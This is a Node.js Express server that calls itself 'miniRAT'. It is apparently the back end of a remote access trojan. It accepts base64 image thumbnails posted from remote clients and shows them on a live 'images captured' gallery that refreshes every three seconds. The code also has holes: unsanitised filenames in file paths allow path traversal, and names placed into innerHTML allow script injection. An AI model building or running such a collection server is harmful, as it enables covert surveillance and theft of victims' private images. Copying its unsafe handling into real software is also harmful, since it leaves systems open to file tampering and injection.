const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const app = express();
const port = 5000;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory
const uploadDir = './uploads';
if (!fs.existsSync(uploadDir)) {
    fs.mkdirSync(uploadDir, { recursive: true });
}

// Serve static files
app.use('/uploads', express.static(uploadDir));

// Storage for multer
const storage = multer.diskStorage({
    destination: uploadDir,
    filename: function (req, file, cb) {
        // For thumbnails, we'll save them differently
        cb(null, 'thumbnail_' + Date.now() + '.jpg');
    }
});

const upload = multer({ storage: storage });

// Route to handle thumbnail uploads
app.post('/api/upload/thumbnail', (req, res) => {
    try {
        const { filename, thumbnail } = req.body;

        // Decode base64 thumbnail
        const thumbnailData = thumbnail.split(',')[1] || thumbnail;
        const buffer = Buffer.from(thumbnailData, 'base64');

        // Save thumbnail with original filename
        const thumbnailPath = path.join(uploadDir, filename + '_thumb.jpg');
        fs.writeFileSync(thumbnailPath, buffer);

        // Also save the original filename for reference
        const metadataPath = path.join(uploadDir, filename + '.metadata.json');
        const metadata = {
            originalName: filename,
            thumbnailPath: filename + '_thumb.jpg',
            uploadedAt: new Date().toISOString()
        };
        fs.writeFileSync(metadataPath, JSON.stringify(metadata, null, 2));

        res.json({
            success: true,
            message: 'Thumbnail uploaded successfully',
            filename: filename,
            thumbnailPath: filename + '_thumb.jpg'
        });

    } catch (error) {
        console.error('Error uploading thumbnail:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to upload thumbnail'
        });
    }
});

// Route to get all thumbnails for gallery view
app.get('/api/thumbnails', (req, res) => {
    try {
        const files = fs.readdirSync(uploadDir);
        const thumbnails = [];

        files.forEach(file => {
            if (file.endsWith('_thumb.jpg')) {
                // Find corresponding metadata
                const metadataFile = file.replace('_thumb.jpg', '.metadata.json');
                let metadata = { originalName: file.replace('_thumb.jpg', '') };

                try {
                    const metadataContent = fs.readFileSync(
                        path.join(uploadDir, metadataFile), 'utf8'
                    );
                    metadata = JSON.parse(metadataContent);
                } catch (e) {
                    // If no metadata, use default
                }

                thumbnails.push({
                    name: metadata.originalName,
                    thumbnail: file,
                    uploadedAt: metadata.uploadedAt
                });
            }
        });

        // Sort by upload time (newest first)
        thumbnails.sort((a, b) => {
            return new Date(b.uploadedAt) - new Date(a.uploadedAt);
        });

        res.json({ thumbnails });

    } catch (error) {
        console.error('Error fetching thumbnails:', error);
        res.status(500).json({
            success: false,
            error: 'Failed to fetch thumbnails'
        });
    }
});

// Route to get full-size images (optional)
app.get('/api/fullsize/:filename', (req, res) => {
    try {
        const { filename } = req.params;
        const fullPath = path.join(uploadDir, filename);

        if (fs.existsSync(fullPath)) {
            res.sendFile(fullPath);
        } else {
            res.status(404).json({ error: 'File not found' });
        }
    } catch (error) {
        console.error('Error serving full-size image:', error);
        res.status(500).json({ error: 'Failed to serve image' });
    }
});

// Serve the gallery interface
app.get('/', (req, res) => {
    res.send(`<!DOCTYPE html>
<html>
<head>
    <title>miniRAT — Live Gallery</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0a0a0a; color: #e0e0e0;
            min-height: 100vh;
        }
        .header {
            padding: 20px 30px;
            border-bottom: 1px solid #222;
            display: flex; align-items: center; justify-content: space-between;
        }
        .header h1 { font-size: 20px; font-weight: 600; }
        .header h1 span { color: #666; font-weight: 400; }
        .status {
            display: flex; align-items: center; gap: 8px;
            font-size: 13px; color: #888;
        }
        .live-dot {
            width: 8px; height: 8px; border-radius: 50%;
            background: #22c55e;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.3; }
        }
        .stats {
            padding: 12px 30px;
            font-size: 13px; color: #666;
            border-bottom: 1px solid #1a1a1a;
        }
        .gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
            gap: 4px; padding: 4px;
        }
        .thumb {
            position: relative; aspect-ratio: 1;
            overflow: hidden; cursor: pointer;
            animation: fadeIn 0.4s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }
        .thumb img {
            width: 100%; height: 100%;
            object-fit: cover; display: block;
            transition: transform 0.2s;
        }
        .thumb:hover img { transform: scale(1.05); }
        .thumb .info {
            position: absolute; bottom: 0; left: 0; right: 0;
            padding: 20px 8px 6px;
            background: linear-gradient(transparent, rgba(0,0,0,0.8));
            font-size: 11px; opacity: 0;
            transition: opacity 0.2s;
        }
        .thumb:hover .info { opacity: 1; }
        .empty {
            grid-column: 1 / -1;
            text-align: center; padding: 80px 20px;
            color: #444; font-size: 15px;
        }
        .empty .icon { font-size: 48px; margin-bottom: 12px; }
    </style>
</head>
<body>
    <div class="header">
        <h1>miniRAT <span>Gallery</span></h1>
        <div class="status">
            <div class="live-dot"></div>
            <span>Live — refreshing every 3s</span>
        </div>
    </div>
    <div class="stats" id="stats">Loading...</div>
    <div id="gallery" class="gallery"></div>

    <script>
        let lastCount = 0;

        async function loadThumbnails() {
            try {
                const response = await fetch('/api/thumbnails');
                const data = await response.json();
                const gallery = document.getElementById('gallery');
                const stats = document.getElementById('stats');

                if (data.thumbnails && data.thumbnails.length > 0) {
                    const count = data.thumbnails.length;
                    const latest = data.thumbnails[0];
                    const latestTime = latest.uploadedAt
                        ? new Date(latest.uploadedAt).toLocaleString()
                        : 'unknown';

                    stats.textContent = count + ' images captured — latest: ' + latestTime;

                    // Only rebuild DOM if count changed
                    if (count !== lastCount) {
                        gallery.innerHTML = '';
                        data.thumbnails.forEach(function(thumb) {
                            const div = document.createElement('div');
                            div.className = 'thumb';
                            const time = thumb.uploadedAt
                                ? new Date(thumb.uploadedAt).toLocaleTimeString()
                                : '';
                            div.innerHTML =
                                '<img src="/uploads/' + thumb.thumbnail + '" alt="' + thumb.name + '">' +
                                '<div class="info">' + thumb.name.substring(0, 24) + '<br>' + time + '</div>';
                            gallery.appendChild(div);
                        });
                        lastCount = count;
                    }
                } else {
                    stats.textContent = '0 images — waiting for uploads...';
                    gallery.innerHTML =
                        '<div class="empty">' +
                        '<div class="icon">📡</div>' +
                        'Waiting for incoming thumbnails...' +
                        '</div>';
                }
            } catch (error) {
                document.getElementById('stats').textContent = 'Connection error — retrying...';
            }
        }

        loadThumbnails();
        setInterval(loadThumbnails, 3000);
    </script>
</body>
</html>`);
});

app.listen(port, '0.0.0.0', () => {
    console.log(`RAT server running at http://localhost:${port}`);
});

// Handle server shutdown
process.on('SIGINT', () => {
    console.log('Shutting down server...');
    process.exit(0);
});
